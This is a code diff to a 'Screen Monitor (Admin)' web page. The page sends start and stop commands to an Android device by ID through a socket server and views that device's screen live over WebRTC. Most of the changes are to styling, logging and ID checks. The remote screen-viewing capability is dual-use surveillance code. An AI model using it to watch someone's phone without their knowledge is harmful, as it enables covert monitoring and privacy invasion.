@@ -15,7 +15,7 @@ video{
     border-radius: 10px;
     margin-top: 20px;
 }
-input{padding:10px; border-radius:5px; border:none;}
+input{padding:10px; border-radius:5px; border:none; width: 200px; text-align: center;}
 button{padding:10px 20px;margin:5px;cursor:pointer;border-radius:5px;border:none;font-weight:bold;}
 .btn-start{background:#28a745;color:white;}
 .btn-stop{background:#dc3545;color:white;}
@@ -26,7 +26,7 @@ button{padding:10px 20px;margin:5px;cursor:pointer;border-radius:5px;border:none
 
 <h2>Screen Monitor (Admin)</h2>
 
-<input id="id" placeholder="Device ID (e.g. 12345)">
+<input id="id" placeholder="Enter Device ID Here">
 <br><br>
 
 <button class="btn-start" onclick="start()">START SCREEN</button>
@@ -39,10 +39,9 @@ button{padding:10px 20px;margin:5px;cursor:pointer;border-radius:5px;border:none
 <video id="v" autoplay playsinline controls></video>
 
 <script>
-// Server URL check kar lena
 const socket = io("https://child-v9no.onrender.com");
 let pc;
-let deviceId;
+let deviceId; // Ye variable store karega ki hum kis phone se connect hain
 
 const iceServers = {
     iceServers: [
@@ -53,32 +52,40 @@ const iceServers = {
 };
 
 socket.on("connect", () => {
-    document.getElementById("status").innerText = "Status: Connected to Server";
-    console.log("Connected to Socket Server");
-    socket.emit("join-room", "ADMIN");
+    document.getElementById("status").innerText = "Status: Server Connected (Waiting for ID)";
+    console.log("✅ Socket Connected");
+    // Hum 'ADMIN' room join kar rahe hain taaki Android humein Offer bhej sake
+    socket.emit("join-room", "ADMIN"); 
 });
 
-// 1. OFFER AAYA (Android se)
+// 1. OFFER AAYA
 socket.on("offer", async (data) => {
     console.log("📡 Offer Received");
+
+    // SAFETY CHECK: Agar humne ID nahi daali, to hum reply nahi kar payenge
+    if (!deviceId) {
+        deviceId = document.getElementById("id").value;
+    }
+    if (!deviceId) {
+        alert("Offer received but No Device ID entered! Please enter ID.");
+        return;
+    }
     
     if (pc) pc.close();
     
     pc = new RTCPeerConnection(iceServers);
 
-    // Incoming Video Stream Handle karna
     pc.ontrack = (event) => {
-        console.log("🎥 Stream Received");
-        const videoElem = document.getElementById("v");
-        videoElem.srcObject = event.streams[0];
-        document.getElementById("status").innerText = "Status: Viewing Screen";
+        console.log("🎥 Stream Started");
+        document.getElementById("v").srcObject = event.streams[0];
+        document.getElementById("status").innerText = "Status: 🔴 Live View";
     };
 
-    // Apne Candidates Android ko bhejna
     pc.onicecandidate = (event) => {
         if (event.candidate) {
+            // Candidates wapas ussi Device ID ko bhejo
             socket.emit("candidate", {
-                target: deviceId,
+                target: deviceId, 
                 candidate: event.candidate.candidate,
                 sdpMid: event.candidate.sdpMid,
                 sdpMLineIndex: event.candidate.sdpMLineIndex
@@ -86,32 +93,23 @@ socket.on("offer", async (data) => {
         }
     };
 
-    // Connection State Debugging
-    pc.oniceconnectionstatechange = () => {
-        console.log("❄️ ICE State:", pc.iceConnectionState);
-        document.getElementById("status").innerText = "ICE State: " + pc.iceConnectionState;
-    };
-
-    // Remote Offer Set karna
     await pc.setRemoteDescription(new RTCSessionDescription({
         type: "offer",
         sdp: data.sdp
     }));
 
-    // Answer Banana
     const answer = await pc.createAnswer();
     await pc.setLocalDescription(answer);
 
-    // Answer Wapas Bhejna
+    // Answer wapas ussi Device ID ko bhejo
     socket.emit("answer", {
         target: deviceId,
         sdp: answer.sdp
     });
 });
 
-// 2. CANDIDATE AAYA (🔥 YE MISSING THA PEHLE)
+// 2. CANDIDATE AAYA
 socket.on("candidate", async (data) => {
-    console.log("🧊 Candidate Received");
     try {
         if (pc) {
             await pc.addIceCandidate(new RTCIceCandidate({
@@ -121,29 +119,33 @@ socket.on("candidate", async (data) => {
             }));
         }
     } catch (e) {
-        console.error("Error adding candidate", e);
+        console.error("Candidate Error:", e);
     }
 });
 
 function start() {
     deviceId = document.getElementById("id").value;
-    if(!deviceId) { alert("Enter Device ID"); return; }
+    if(!deviceId) { alert("Please Enter Device ID first"); return; }
     
-    console.log("Sending Start Command to: " + deviceId);
-    document.getElementById("status").innerText = "Status: Waiting for device...";
+    console.log("🚀 Sending Start Command to: " + deviceId);
+    document.getElementById("status").innerText = "Status: Connecting to " + deviceId + "...";
     
-    socket.emit("command", { // Note: Server code check karna, usually wrapper object hota hai
-        target: deviceId,    // Server logic ke hisab se 'targetId' ya 'target' check karlena
+    // Server command ussi specific Device Room mein bhejega
+    socket.emit("command", {
+        target: deviceId,
         command: "start_screen"
     });
 }
 
 function stop() {
-    if(!deviceId) return;
-    socket.emit("command", {
-        target: deviceId,
-        command: "stop_screen"
-    });
+    if(!deviceId) deviceId = document.getElementById("id").value;
+    
+    if(deviceId) {
+        socket.emit("command", {
+            target: deviceId,
+            command: "stop_screen"
+        });
+    }
     
     if (pc) {
         pc.close();
